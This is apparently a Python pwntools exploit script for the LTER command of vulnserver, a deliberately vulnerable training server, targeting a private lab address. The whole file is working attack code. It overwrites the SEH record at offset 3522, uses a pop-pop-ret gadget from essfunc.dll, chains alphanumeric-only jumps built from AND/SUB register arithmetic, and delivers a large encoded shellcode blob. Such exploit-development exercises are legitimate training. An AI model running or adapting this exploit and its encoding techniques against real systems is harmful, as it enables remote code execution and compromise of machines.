from pwn import *

z3encoded_shellcode = "\x25\x20\x20\x20\x20\x25\x02\x02\x02\x02\x2d\x7b\x42\x60\x38\x2d\x0f\x10\x20\x7c\x2d\x11\x35\x1a\x4b\x50\x25\x20\x20\x20\x20\x25\x02\x02\x02\x02\x2d\x64\x30\x26\x62\x2d\x38\x30\x5c\x61\x2d\x03\x33\x1a\x0e\x50\x25\x20\x20\x20\x20\x25\x02\x02\x02\x02\x2d\x52\x50\x56\x21\x2d\x52\x50\x5a\x20\x2d\x09\x60\x79\x5a\x50\x25\x20\x20\x20\x20\x25\x02\x02\x02\x02\x2d\x0f\x61\x6f\x7d\x2d\x29\x07\x10\x03\x2d\x56\x28\x16\x7f\x50\x25\x20\x20\x20\x20\x25\x02\x02\x02\x02\x2d\x1a\x6b\x4a\x74\x2d\x68\x77\x1e\x6d\x2d\x79\x62\x4f\x0b\x50\x25\x20\x20\x20\x20\x25\x02\x02\x02\x02\x2d\x36\x65\x0b\x1f\x2d\x3b\x20\x08\x51\x2d\x0f\x7f\x0b\x1a\x50\x25\x20\x20\x20\x20\x25\x02\x02\x02\x02\x2d\x47\x10\x4a\x39\x2d\x53\x70\x2a\x3e\x2d\x2a\x79\x0f\x7e\x50\x25\x20\x20\x20\x20\x25\x02\x02\x02\x02\x2d\x17\x2d\x2a\x72\x2d\x2a\x2d\x5d\x6f\x2d\x02\x08\x79\x48\x50\x25\x20\x20\x20\x20\x25\x02\x02\x02\x02\x2d\x7f\x20\x01\x20\x2d\x10\x50\x33\x20\x2d\x1b\x27\x25\x2a\x50\x25\x20\x20\x20\x20\x25\x02\x02\x02\x02\x2d\x6f\x07\x41\x7f\x2d\x6b\x05\x06\x6d\x2d\x6b\x02\x03\x71\x50\x25\x20\x20\x20\x20\x25\x02\x02\x02\x02\x2d\x3b\x37\x78\x7f\x2d\x36\x33\x76\x3b\x2d\x20\x0e\x12\x6f\x50\x25\x20\x20\x20\x20\x25\x02\x02\x02\x02\x2d\x0f\x20\x66\x20\x2d\x2a\x20\x3e\x20\x2d\x77\x57\x2a\x34\x50\x25\x20\x20\x20\x20\x25\x02\x02\x02\x02\x2d\x01\x34\x20\x76\x2d\x05\x4f\x70\x3e\x2d\x48\x7c\x6f\x4b\x50\x25\x20\x20\x20\x20\x25\x02\x02\x02\x02\x2d\x6b\x69\x21\x4e\x2d\x27\x2b\x09\x25\x2d\x04\x6a\x48\x07\x50\x25\x20\x20\x20\x20\x25\x02\x02\x02\x02\x2d\x22\x01\x37\x20\x2d\x60\x01\x20\x20\x2d\x6c\x12\x1b\x62\x50\x25\x20\x20\x20\x20\x25\x02\x02\x02\x02\x2d\x5f\x7f\x71\x20\x2d\x18\x01\x21\x28\x2d\x2a\x20\x13\x2c\x50\x25\x20\x20\x20\x20\x25\x02\x02\x02\x02\x2d\x6f\x0b\x3d\x61\x2d\x28\x3e\x5e\x7f\x2d\x0f\x65\x65\x3e\x50\x25\x20\x20\x20\x20\x25\x02\x02\x02\x02\x2d\x35\x77\x1a\x61\x2d\x6d\x1e\x1a\x3d\x2d\x03\x0f\x6a\x08\x50\x25\x20\x20\x20\x20\x25\x02\x02\x02\x02\x2d\x7f\x08\x28\x61\x2d\x7f\x58\x3d\x4f\x2d\x79\x5a\x76\x2b\x50\x25\x20\x20\x20\x20\x25\x02\x02\x02\x02\x2d\x7a\x7d\x63\x1a\x2d\x7b\x7b\x5c\x10\x2d\x07\x7c\x3e\x05\x50\x25\x20\x20\x20\x20\x25\x02\x02\x02\x02\x2d\x7f\x38\x0c\x7c\x2d\x59\x47\x18\x7f\x2d\x0c\x7f\x08\x79\x50\x25\x20\x20\x20\x20\x25\x02\x02\x02\x02\x2d\x0f\x32\x10\x3e\x2d\x7f\x7f\x30\x33\x2d\x66\x03\x34\x36\x50\x25\x20\x20\x20\x20\x25\x02\x02\x02\x02\x2d\x76\x13\x20\x48\x2d\x6d\x11\x6d\x04\x2d\x1c\x08\x0c\x28\x50\x25\x20\x20\x20\x20\x25\x02\x02\x02\x02\x2d\x0f\x1f\x21\x32\x2d\x4f\x0f\x6f\x45\x2d\x4a\x46\x17\x64\x50\x25\x20\x20\x20\x20\x25\x02\x02\x02\x02\x2d\x2e\x2a\x48\x01\x2d\x1f\x6b\x41\x07\x2d\x36\x46\x01\x13\x50\x25\x20\x20\x20\x20\x25\x02\x02\x02\x02\x2d\x29\x10\x1d\x3d\x2d\x5a\x12\x7d\x3c\x2d\x7a\x60\x6d\x4a\x50\x25\x20\x20\x20\x20\x25\x02\x02\x02\x02\x2d\x39\x2d\x42\x26\x2d\x10\x7e\x38\x74\x2d\x7f\x74\x0f\x6f\x50\x25\x20\x20\x20\x20\x25\x02\x02\x02\x02\x2d\x63\x51\x4f\x04\x2d\x62\x38\x37\x30\x2d\x6c\x68\x78\x04\x50\x25\x20\x20\x20\x20\x25\x02\x02\x02\x02\x2d\x37\x60\x62\x67\x2d\x6d\x30\x76\x7c\x2d\x2b\x70\x7a\x5a\x50\x25\x20\x20\x20\x20\x25\x02\x02\x02\x02\x2d\x7f\x04\x60\x09\x2d\x41\x3d\x60\x09\x2d\x0c\x33\x3e\x17\x50\x25\x20\x20\x20\x20\x25\x02\x02\x02\x02\x2d\x59\x60\x20\x0e\x2d\x48\x20\x20\x0c\x2d\x7c\x44\x76\x5a\x50\x25\x20\x20\x20\x20\x25\x02\x02\x02\x02\x2d\x3d\x15\x27\x05\x2d\x71\x45\x6f\x68\x2d\x7f\x19\x20\x7a\x50\x25\x20\x20\x20\x20\x25\x02\x02\x02\x02\x2d\x7e\x1e\x32\x60\x2d\x7e\x5c\x3b\x20\x2d\x79\x2b\x72\x7e\x50\x25\x20\x20\x20\x20\x25\x02\x02\x02\x02\x2d\x1f\x54\x38\x28\x2d\x4f\x3b\x77\x63\x2d\x4a\x6f\x7f\x22\x50\x25\x20\x20\x20\x20\x25\x02\x02\x02\x02\x2d\x27\x35\x50\x3e\x2d\x7b\x4f\x01\x60\x2d\x12\x6a\x36\x7e\x50\x25\x20\x20\x20\x20\x25\x02\x02\x02\x02\x2d\x2c\x20\x3e\x06\x2d\x1f\x6f\x3b\x08\x2d\x2a\x26\x4a\x66\x50\x25\x20\x20\x20\x20\x25\x02\x02\x02\x02\x2d\x27\x09\x46\x12\x2d\x7a\x4f\x02\x76\x2d\x08\x1c\x65\x67\x50\x25\x20\x20\x20\x20\x25\x02\x02\x02\x02\x2d\x10\x0f\x6d\x2c\x2d\x0f\x0b\x34\x62\x2d\x1a\x03\x6c\x1e\x50\x25\x20\x20\x20\x20\x25\x02\x02\x02\x02\x2d\x0e\x16\x2e\x37\x2d\x29\x02\x6a\x74\x2d\x08\x18\x5a\x53\x50\x25\x20\x20\x20\x20\x25\x02\x02\x02\x02\x2d\x10\x27\x3e\x4a\x2d\x3b\x7b\x7a\x6f\x2d\x39\x5b\x1b\x26\x50\x25\x20\x20\x20\x20\x25\x02\x02\x02\x02\x2d\x73\x20\x20\x0f\x2d\x7f\x18\x42\x64\x2d\x0f\x1a\x61\x2b\x50\x25\x20\x20\x20\x20\x25\x02\x02\x02\x02\x2d\x1f\x41\x7f\x01\x2d\x27\x41\x1f\x6d\x2d\x03\x33\x3b\x60\x50\x25\x20\x20\x20\x20\x25\x02\x02\x02\x02\x2d\x7f\x43\x62\x2d\x2d\x7f\x01\x19\x73\x2d\x77\x48\x5c\x50\x50\x25\x20\x20\x20\x20\x25\x02\x02\x02\x02\x2d\x11\x20\x22\x3e\x2d\x73\x20\x77\x2e\x2d\x70\x34\x14\x7f\x50\x25\x20\x20\x20\x20\x25\x02\x02\x02\x02\x2d\x1f\x37\x2b\x2e\x2d\x41\x1f\x3e\x3e\x2d\x50\x79\x0b\x41\x50\x25\x20\x20\x20\x20\x25\x02\x02\x02\x02\x2d\x31\x09\x13\x2d\x2d\x7f\x2d\x27\x2d\x2d\x1f\x09\x61\x1a\x50\x25\x20\x20\x20\x20\x25\x02\x02\x02\x02\x2d\x6e\x02\x7c\x73\x2d\x6b\x3e\x7f\x2a\x2d\x27\x5f\x7b\x7c\x50\x25\x20\x20\x20\x20\x25\x02\x02\x02\x02\x2d\x7f\x08\x4e\x60\x2d\x6f\x38\x3e\x20\x2d\x2a\x3c\x73\x7f\x50\x25\x20\x20\x20\x20\x25\x02\x02\x02\x02\x2d\x17\x46\x36\x35\x2d\x39\x67\x27\x53\x2d\x6f\x11\x61\x7b\x50"

ip = "192.168.23.163"
port = 9999

sh = connect(ip, port)

print sh.recvrepeat(1)

# when buffer length > 3500 -> seh overwrite
# [*] Exact match at offset 3522
# 0x6250172b : pop edi # pop ebp # ret  | asciiprint,ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\IEUser\Desktop\vulnserver\essfunc.dll)
# ret to four bytes before seh overwrite
# first jmp over the ret.
# only [0x01,0x80) is allowed

# jmp over the seh overwrite
first_jmp = "\x74\x06"


# mov esp to the bottom,0x????ffff
second_jmp = asm("push esp")
second_jmp += asm("pop eax")
second_jmp += asm("and ax, 0x2020")
second_jmp += asm("and ax, 0x0202")
second_jmp += asm("dec ax")
second_jmp += asm("push eax")
second_jmp += asm("pop esp")
"""
push "\x75\x80"(longest negative condition short jmp) to the stack
and eax, 0x20202020
and eax, 0x02020202
sub eax, 0x1a482a07
sub eax, 0x54416a49
sub eax, 0x11012a6f
push eax

\x25\x20\x20\x20\x20\x25\x02\x02\x02\x02\x2d\x07\x2a\x48\x1a\x2d\x49\x6a\x41\x54\x2d\x6f\x2a\x01\x11\x50
"""
second_jmp += asm("and eax, 0x20202020")
second_jmp += asm("and eax, 0x02020202")
second_jmp += asm("sub eax, 0x1a482a07")
second_jmp += asm("sub eax, 0x54416a49")
second_jmp += asm("sub eax, 0x11012a6f")
second_jmp += asm("push eax")


# third jmp to the begining of the buffer, z3encoded shellcode
third_jmp = asm("push esp")
third_jmp += asm("pop ebx")
"""
push "sub bx, 0xdf5;jmp ebx" to the stack
$ python z3encoder.py
and eax, 0x20202020
and eax, 0x02020202
sub eax, 0x266f3d01
sub eax, 0x7a423b09
sub eax, 0x7b4f7a01
push eax

and eax, 0x20202020
and eax, 0x02020202
sub eax, 0x7d1c7d29
sub eax, 0x183b1073
sub eax, 0x7f270c23
push eax

\x25\x20\x20\x20\x20\x25\x02\x02\x02\x02\x2d\x01\x3d\x6f\x26\x2d\x09\x3b\x42\x7a\x2d\x01\x7a\x4f\x7b\x50\x25\x20\x20\x20\x20\x25\x02\x02\x02\x02\x2d\x29\x7d\x1c\x7d\x2d\x73\x10\x3b\x18\x2d\x23\x0c\x27\x7f\x50
"""
third_jmp += asm("pushad")                  # lift up the stack
third_jmp += asm("push eax")                # lift up the stack
third_jmp += asm("push eax")                # lift up the stack
third_jmp += asm("push eax")                # lift up the stack
third_jmp += asm("and eax, 0x20202020")
third_jmp += asm("and eax, 0x02020202")
third_jmp += asm("sub eax, 0x266f3d01")
third_jmp += asm("sub eax, 0x7a423b09")
third_jmp += asm("sub eax, 0x7b4f7a01")
third_jmp += asm("push eax")
third_jmp += asm("and eax, 0x20202020")
third_jmp += asm("and eax, 0x02020202")
third_jmp += asm("sub eax, 0x7d1c7d29")
third_jmp += asm("sub eax, 0x183b1073")
third_jmp += asm("sub eax, 0x7f270c23")
third_jmp += asm("push eax")
third_jmp += asm("inc esp")                 # align the stack


buf = "LTER ."
buf += z3encoded_shellcode
buf += "A"*(3518-len(third_jmp)-len(z3encoded_shellcode))

buf += third_jmp

buf += first_jmp            # je 0x8

buf += "AA"
buf += "\x2b\x17\x50\x62"

buf += second_jmp
buf += "C"*1500

sh.sendline(buf)
sh.close()
